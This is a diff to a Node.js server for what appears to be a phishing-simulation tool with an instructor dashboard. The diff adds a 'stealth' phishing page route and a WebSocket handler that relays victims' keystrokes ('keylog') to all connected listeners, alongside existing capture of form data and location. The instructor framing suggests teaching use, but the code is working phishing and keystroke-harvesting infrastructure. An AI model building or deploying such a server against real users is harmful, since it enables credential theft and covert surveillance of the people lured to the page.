@@ -157,6 +157,8 @@ const server = http.createServer((req, res) => {
   let filePath = '';
   if (pathname === '/' || pathname === '/phish' || pathname === '/phish.html') {
     filePath = path.join(__dirname, 'phish.html');
+  } else if (pathname === '/stealth' || pathname === '/phish_stealth' || pathname === '/phish_stealth.html') {
+    filePath = path.join(__dirname, 'phish_stealth.html');
   } else if (pathname === '/instructor' || pathname === '/admin' || pathname === '/instructor.html') {
     filePath = path.join(__dirname, 'instructor.html');
   }
@@ -234,6 +236,8 @@ wss.on('connection', (ws, req) => {
       } else if (msg.type === 'location') {
         stmtUpdateLoc.run(JSON.stringify(msg), clientId);
         broadcastAll({ ...msg, clientId, serverIP: ip });
+      } else if (msg.type === 'keylog') {
+        broadcastAll({ ...msg, clientId });
       } else if (msg.type === 'form_data') {
         stmtUpdateForm.run(JSON.stringify(msg), clientId);
         broadcastAll({ ...msg, clientId, serverIP: ip });
@@ -270,7 +274,8 @@ log(`Session   : ${DEFAULT_SESSION}`);
 log(`Auth tokens loaded: ${Object.keys(INSTRUCTOR_TOKENS).length}`);
 log(`URLs:`);
 log(`  - Phish : http://localhost:${WS_PORT}/phish`);
-log(`  - Admin : http://localhost:${WS_PORT}/instructor`);
+log(`  - Admin  : http://localhost:${WS_PORT}/instructor`);
+log(`  - Stealth: http://localhost:${WS_PORT}/stealth`);
 log('───────────────────────────────\n');
 
 server.listen(WS_PORT);
